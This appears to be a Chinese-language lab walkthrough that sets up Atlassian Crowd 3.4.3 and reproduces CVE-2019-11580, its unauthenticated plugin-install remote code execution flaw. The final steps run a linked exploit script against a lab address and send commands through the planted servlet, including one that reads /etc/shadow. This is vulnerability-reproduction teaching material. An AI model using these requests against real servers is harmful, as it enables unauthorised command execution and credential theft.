---
description: CVE-2019-11580
---

# Atlassian Crowd RCE漏洞分析

## 【原理】

Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件。从而使攻击者可以在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，攻击者借用此漏洞安装的恶意插件可以在目标服务器上执行任意命令，从而获得服务器权限。

## 【工具】

* Atlassian Crowd
* Python

## 【步骤】

1.点击启动场景按钮，等待场景启动完成后，通过靶标接入协议进入漏洞标靶

2.下载漏洞影响版本代码，这里我们选择3.4.3版本

```javascript
https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip
```

3.在Ubuntu中安装好JDK环境，病配置好JAVA\_HOME和JRE\_HOME等环境变量，如下所示。

```javascript
JAVA_HOME=/usr/share/jdk1.8.0_221/
JRE_HOME=/usr/share/jdk1.8.0_221/jre
CLASS_PATH=.:$JAVA_HOME/lib:$JRE_HOME/lib  
PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin  
export JAVA_HOME JRE_HOME PATH
```

重启系统使用java和javac命令测试即可。

4.将漏洞代码文件解压之后移动到/var目录下

```text
hacker@hacker:~$ su
密码： 
root@hacker:/home/hacker# ls
examples.desktop  公共的  模板  视频  图片  文档  下载  音乐  桌面
root@hacker:/home/hacker# cd 桌面
root@hacker:/home/hacker/桌面# ls
atlassian-crowd-3.4.3
root@hacker:/home/hacker/桌面# mv atlassian-crowd-3.4.3 /var/
root@hacker:/home/hacker/桌面# cd /var
root@hacker:/var# cd atlassian-crowd-3.4.3/
root@hacker:/var/atlassian-crowd-3.4.3# pwd
/var/atlassian-crowd-3.4.3
```

![image-20210224095601862](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224095601862.png)

5.修改crowd-init.properties 配置文件，设置主目录

```javascript
vi /var/atlassian-crowd-3.4.3/crowd-webapp/WEB-INF/classes/crowd-init.properties
```

![image-20210224103227616](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224103227616.png)

保存退出~

6.然后回到环境主目录中启动环境 ,执行启动命令即可

```javascript
./start_crowd.sh
```

![image-20210224100839612](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224100839612.png)

7.浏览器访问环境链接

```javascript
http://ip:8095/
192.168.166.18:8095
```

![image-20210224100913405](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224100913405.png)

8.点击安装，在中间需要输入license

![image-20210224103323767](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224103323767.png)

去官网注册个账号获取一个月的试用期即可:[https://my.atlassian.com/product](https://my.atlassian.com/product)

![image-20210224104154928](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224104154928.png)

![image-20210224104322993](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224104322993.png)

![image-20210224104400575](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224104400575.png)

![image-20210224104416819](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224104416819.png)

![image-20210224104534037](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224104534037.png)

![image-20210224105640528](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224105640528.png)

9.安装完成之后即可登录

![image-20210224105716262](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224105716262.png)

![image-20210224105757949](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224105757949.png)

10.下载漏洞利用脚本：[https://gitee.com/Harveysn0w/CVE-2019-11580](https://gitee.com/Harveysn0w/CVE-2019-11580)

![image-20210224111451218](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224111451218.png)

11.使用脚本测试漏洞

```text
cd Documents/CVE-2019-11580/exp
python CVE-2019-11580.py http://192.168.166.18:8095
```

![AE0B56BA2D0321DA8A1E93E521B9CAD5](https://gitee.com/Harveysn0w/mac-note_img/raw/master/AE0B56BA2D0321DA8A1E93E521B9CAD5.jpg)

12.通过浏览器访问链接测试其他命令：

```text
http://192.168.166.18:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
```

![image-20210224112346276](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224112346276.png)

漏洞利用成功

13，getshell

```text
curl "http://192.168.166.18:8095/crowd/plugins/servlet/exp?cmd=whoami"
```

![image-20210224112532671](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210224112532671.png)

